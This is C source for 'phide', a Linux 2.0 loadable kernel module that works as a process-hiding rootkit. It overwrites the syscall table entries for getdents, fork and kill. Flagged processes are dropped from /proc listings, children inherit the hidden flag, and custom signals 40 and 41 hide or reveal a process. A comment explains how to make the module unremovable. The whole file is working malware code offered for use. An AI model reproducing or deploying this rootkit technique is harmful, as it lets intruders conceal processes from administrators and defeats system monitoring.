/*
 * phide_mod.c, part of phide by noupe [tm@ns2.crw.se]
 *
 * This is a 20min hack to hide processes and their childs
 * under Linux 2.0.
 * See the README for more info.
 *
 */

#define __KERNEL__
#define MODULE


#define PF_INVISIBLE 0x10000000
#define SIGHIDE 40
#define SIGUNHIDE 41


#include <linux/kernel.h>
#include <linux/module.h>
#include <sys/syscall.h>
#include <linux/proc_fs.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <asm/unistd.h>


extern void* sys_call_table[];
static int errno; /* dunno why :-) */

static inline _syscall1(int, fork, int, regs);
static inline _syscall2(int, kill, pid_t, pid, int, sig);

static int (*orig_kill)(pid_t, int);
int (*orig_getdents) (uint, struct dirent *, uint);
static pid_t (*orig_fork)(struct pt_regs);

static int hacked_getdents(unsigned int, struct dirent *, unsigned int);
static int phide_atoi(char *);
static int is_invisible(pid_t);


static int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
	unsigned int tmp, n;
	int proc = 0, t;
	struct inode *dinode;
	struct dirent *dirp_kern, *p_dk;

	if(!(tmp = (*orig_getdents) (fd, dirp, count)))
		return -errno;

	/* Wonder why you need this => */
#ifdef __LINUX_DCACHE_H
	dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
	dinode = current->files->fd[fd]->f_inode;
#endif

	if(dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
		proc = 1;

	dirp_kern = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
	memcpy_fromfs(dirp_kern, dirp, tmp);
	p_dk = dirp_kern;
	t = tmp;
	while (t > 0) 
	{
		n = p_dk->d_reclen;
		t -= n;

		if(proc && is_invisible(phide_atoi(p_dk->d_name)))
		{
			if (t != 0)
				memmove(p_dk, (char *) p_dk + p_dk->d_reclen, t);
			else
				p_dk->d_off = 1024;

			tmp -= n;
		}

		if (p_dk->d_reclen == 0) 
		{
			tmp -= t;
			t = 0;
		}

		if (t != 0)
			p_dk = (struct dirent *) ((char *) p_dk + p_dk->d_reclen);
	}

	memcpy_tofs(dirp, dirp_kern, tmp);
	kfree(dirp_kern);
	return tmp;
}


static pid_t hacked_fork(struct pt_regs regs)
{
	pid_t pid;
	int hideit;
	struct task_struct *t = current;

	hideit = is_invisible(current->pid);
	pid = (*orig_fork)(regs);

	do
	{
		if(t->pid == pid)
			break;

		t = t->next_task;
	} while(t != current);

	if(t->pid == pid && hideit)
		t->flags |= PF_INVISIBLE;

	return pid;
}


static int hacked_kill(pid_t pid, int sig)
{
	int ret;
	struct task_struct *t = current;

	if(sig != SIGHIDE && sig != SIGUNHIDE)
	{
		if((ret = (*orig_kill)(pid, sig)) == -1)
			return -errno;

		return ret;
	}

	do
	{
		if(t->pid == pid)
			break;

		t = t->next_task;
	} while(t != current);

	if(t->pid != pid)
		return -ESRCH;
		
#ifdef ONLY_ROOT_CAN_HIDE
	if(current->uid && current->euid)
		return -EPERM;
#endif

	switch(sig)
	{
		case SIGHIDE:
		t->flags |= PF_INVISIBLE;
		break;

		case SIGUNHIDE:
		t->flags &= ~PF_INVISIBLE;
		break;

		default:
		break;
	}

	return 0;
}


static int phide_atoi(char *s)
{
	char *p;
	int ret = 0;
	int m = ret + 1;

	for(p = &s[strlen(s) - 1];p >= s;p--)
	{
		if(*p < '0' || *p > '9')
			return 0;

		ret += (*p - '0') * m;
		m *= 10;
	}

	return ret;
}


static int is_invisible(pid_t pid)
{
	struct task_struct *t = current;

	do
	{
		if(t->pid == pid)
			break;

		t = t->next_task;
	} while(t != current);

	if(t->pid != pid)
		return 0;

	return (t->flags & PF_INVISIBLE);
}


int init_module(void)
{
	orig_getdents = sys_call_table[SYS_getdents];
	sys_call_table[SYS_getdents] = hacked_getdents;

	orig_fork = sys_call_table[SYS_fork];
	sys_call_table[SYS_fork] = hacked_fork;

	orig_kill = sys_call_table[SYS_kill];
	sys_call_table[SYS_kill] = hacked_kill;

	/* To make the module unremovable uncomment the line below => */
	/* MOD_INC_USE_COUNT; */ 

	return 0;
}


void cleanup_module(void)
{
	sys_call_table[SYS_getdents] = orig_getdents;
	sys_call_table[SYS_fork] = orig_fork;
	sys_call_table[SYS_kill] = orig_kill;
}
